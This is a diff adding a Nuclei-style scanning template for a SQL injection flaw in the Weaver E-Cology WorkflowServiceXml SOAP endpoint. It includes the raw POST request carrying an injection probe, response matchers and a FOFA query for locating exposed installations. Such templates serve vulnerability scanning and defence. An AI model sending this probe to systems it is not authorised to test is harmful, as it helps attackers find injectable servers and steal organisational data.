@@ -1,0 +1,40 @@
+id: QVD-2024-26136
+
+info:
+  name: 泛微E-Cology WorkflowServiceXml SQL注入漏洞
+  author: fgz
+  severity: high
+  description: 泛微E-Cology 是一款协同管理平台，旨在为中大型组织创建全新的高效协同办公环境。身份认证、电子签名、电子签章、数据存证让合同全程数字化。包含流程、门户、知识、人事、沟通、客户、项目、财务等 20多个功能模块。该系统WorkflowServiceXml接口处未对用户输入进行有效过滤，直接将其拼接进了SQL语句中，导致SQL注入漏洞，会导致数据泄露。
+  metadata:
+    max-request: 1
+    fofa-query: app="泛微-OA（e-cology）"
+    verified: true
+
+requests:
+  - raw:
+      - |+
+        POST /services/WorkflowServiceXml HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
+        Content-Type: text/xml
+        Connection: close
+        
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservices.workflow.weaver">
+        <soapenv:Header/>
+        <soapenv:Body>
+        <web:getHendledWorkflowRequestList>
+        <web:in0>1</web:in0>
+        <web:in1>1</web:in1>
+        <web:in2>1</web:in2>
+        <web:in3>1</web:in3>
+        <web:in4>
+        <web:string>1=1 AND 2=2</web:string>
+        </web:in4>
+        </web:getHendledWorkflowRequestList>
+        </soapenv:Body>
+        </soapenv:Envelope>
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200 && contains(body, 'system') && contains(body, 'administrator') && contains(body, '提醒')"
